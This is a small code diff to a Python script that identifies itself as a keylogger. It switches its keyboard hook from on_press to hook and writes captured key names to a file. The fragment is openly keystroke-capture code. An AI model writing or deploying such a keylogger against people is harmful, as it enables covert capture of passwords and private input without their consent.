@@ -15,7 +15,7 @@ def on_key_event(event):
             f.write(event.name)
 
 # Set up the keylogger
-keyboard.on_press(on_key_event)
+keyboard.hook(on_key_event)
 
 print("Keylogger is running... Press 'Esc' to stop.")
 
